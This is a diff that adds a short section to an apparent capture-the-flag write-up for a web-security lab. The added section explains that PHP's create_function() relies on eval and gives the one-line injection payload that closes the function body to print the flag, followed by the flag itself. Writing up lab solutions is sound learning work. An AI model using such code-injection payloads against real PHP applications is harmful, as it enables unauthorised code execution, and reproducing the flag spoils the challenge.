@@ -60,6 +60,18 @@ echo file_get_contents('flag.txt');
 WEBSEC{BypassingImageChecksToRCE}
 ```
 
+## Level 15
+
+create_function() uses eval
+
+```php
+};echo $flag;//
+```
+
+```
+WEBSEC{HHVM_was_right_about_not_implementing_eval}
+```
+
 ## Level 17
 
 Bypass strcasecmp by providing array instead of string
